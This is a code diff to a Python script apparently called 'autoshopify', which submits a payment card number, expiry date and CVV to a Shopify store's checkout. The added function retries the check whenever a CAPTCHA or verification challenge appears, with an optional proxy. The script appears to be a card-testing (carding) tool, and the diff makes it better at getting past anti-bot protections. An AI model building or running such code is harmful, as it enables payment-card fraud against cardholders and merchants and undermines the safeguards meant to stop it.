@@ -1597,5 +1597,32 @@ async def autoshopify(url, card, session):
 async def main():
     async with httpx.AsyncClient(timeout=90) as session:
         await autoshopify("https://maxandfix.com/", "5312378810154759|04|31|921", session)
+
+
+async def autoshopify_with_captcha_retry(
+    url,
+    card,
+    session,
+    max_captcha_retries=3,
+    proxy=None,
+):
+    last_result = None
+    for attempt in range(max_captcha_retries):
+        try:
+            result = await autoshopify(url, card, session)
+            last_result = result
+            response = str(result.get("Response", "")).upper()
+            if any(key in response for key in ["CAPTCHA", "HCAPTCHA", "RECAPTCHA", "CHALLENGE", "VERIFY"]):
+                if attempt < max_captcha_retries - 1:
+                    await asyncio.sleep(0.6)
+                    continue
+            return result
+        except Exception as exc:
+            last_result = {"Response": f"ERROR: {str(exc)[:80]}", "Status": False}
+            if attempt < max_captcha_retries - 1:
+                await asyncio.sleep(0.6)
+                continue
+            return last_result
+    return last_result or {"Response": "CAPTCHA_RETRY_EXHAUSTED", "Status": False}
 if __name__ == "__main__":
     asyncio.run(main())
